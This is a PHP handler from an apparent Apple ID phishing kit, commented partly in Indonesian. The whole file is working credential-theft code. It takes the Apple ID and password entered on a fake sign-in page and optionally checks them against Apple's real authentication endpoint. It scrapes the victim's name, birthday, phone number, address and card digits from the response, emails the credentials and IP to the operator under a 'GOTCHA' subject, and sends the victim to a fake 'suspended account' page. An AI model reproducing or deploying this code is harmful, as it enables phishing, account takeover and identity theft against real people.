<?php
require_once('function.shc.php');
$config = $apple->load_config();
$ip 	= $apple->ip();
if(empty(session_id())){
	session_start();
}
if(empty($_POST['accountPassword']) && empty($_POST['appleId'])){
	header('Location: /?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true&login=p2');
}
if(strlen($_POST['accountPassword']) >= 8 && strlen($_POST['appleId']) >= 5){

	if (!filter_var($_POST['appleId'], FILTER_VALIDATE_EMAIL) === false) {
		
		$apple->logs("Login Success"); // log activity

		######################[ TRUE LOGIN = TRUE]###################################
		if($config['truelogin'] == true){

			$custom = array(
				'post' => 'appleId='.$_POST['appleId'].'&accountPassword='.$_POST['accountPassword'].'&appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD', 
			);

			$login  = $apple->sdata("https://idmsa.apple.com/IDMSWebAuth/authenticate",$custom,true);
			preg_match_all("<p id=\"errormsg\">", $login['data'], $matches);
			if($matches[0][0]){
				header('Location:  /?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true&login=lfailed');
			}else{
				$_SESSION['status_login'] = true;
				preg_match_all('/"firstName":"(.*?)","lastName":"(.*?)"/', $login['data'], $fullname);
				preg_match_all('/"accountName":"(.*?)"/', $login['data'], $accountName);
				preg_match_all('/"birthday":"(.*?)"/', $login['data'], $dob);
				preg_match_all('/"fullNumberWithCountryPrefix":"(.*?)"/', $login['data'], $num);
				preg_match_all('/"obfuscatedNumber":"(.*?)"/', $login['data'], $card);
				preg_match_all('/"fullAddress":"(.*?)"/', $login['data'], $fullAddress);
				preg_match_all('/"postalCode":"(.*?)"/', $login['data'], $zip);
				preg_match_all('/"city":"(.*?)"/', $login['data'], $city);
				preg_match_all('/"stateProvinceName":"(.*?)"/', $login['data'], $prov);
				preg_match_all('/"line1":"(.*?)","line2":"(.*?)"/',  $login['data'], $line);
				$_SESSION['personal_data'] = array(
					'namadepan' 	=> $fullname[1][0],
					'namabelakang' 	=> $fullname[2][0], 
					'email' 		=> $accountName[1][0],
					'fullAddress'   => $fullAddress[1][0],
					'cc'			=> $card[1][0],
					'line1' 		=> $line[1][0],
					'line2' 		=> $line[2][0],
					'nomor' 		=> $num[1][0],
					'dob' 			=> $dob[1][0], 
					'city' 			=> $city[1][1],
					'zip'			=> $zip[1][0],
					'state' 		=> $prov[1][0],
				);

				$_SESSION['status_login'] 	= true;
				$_SESSION['apple_email'] 	= $_POST['appleId'];
				$_SESSION['apple_password'] = $_POST['accountPassword'];
				
				$mailBody .= " .++=======[ Apple Info ]=======++. \r\n";
            	$mailBody .= "Apple Email    :".$_POST['appleId']."\r\n";
            	$mailBody .= "Apple Password :".$_POST['accountPassword']."\r\n\n";
            	$mailBody .= " .++============================++. \r\n";

				$subject = "GOTCHA : [Akun Apel] [".$ip['cn']."|".$_SERVER['REMOTE_ADDR']."]";
            	$apple->sendMe($subject,$mailBody,$ip['cn']);
			}
		}
		######################[ TRUE LOGIN = FALSE]###################################
		if($config['truelogin'] == false){

			preg_match_all('/(?:(?<Numbers>[0-9]{1})|(?<Alpha>[a-zA-Z]{1})|(?<Special>[^a-zA-Z0-9]{1})){6,50}$/', $_POST['accountPassword'], $matches);
			if($matches[0][0]){
				

				$_SESSION['status_login'] 	= true;
				$_SESSION['apple_email'] 	= $_POST['appleId'];
				$_SESSION['apple_password'] = $_POST['accountPassword'];

				$mailBody .= " .++=======[ Apple Info ]=======++. \r\n";
            	$mailBody .= "Apple Email    :".$_POST['appleId']."\r\n";
            	$mailBody .= "Apple Password :".$_POST['accountPassword']."\r\n\n";
            	$mailBody .= " .++============================++. \r\n";

				$subject = "GOTCHA : [Akun Apel] [".$ip['cn']."|".$_SERVER['REMOTE_ADDR']."]";
            	$apple->sendMe($subject,$mailBody,$ip['cn']);
				
				header('Location:  /account/manage/suspended/?suspended=true&appIdKey='.md5(time()).md5(time()).'&path=/account/manage?referrer=/signin/&sslEnabled=true&login=suspended');
			}else{
				header('Location:  /?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true&login=lfailed');
			}
		}
	}
}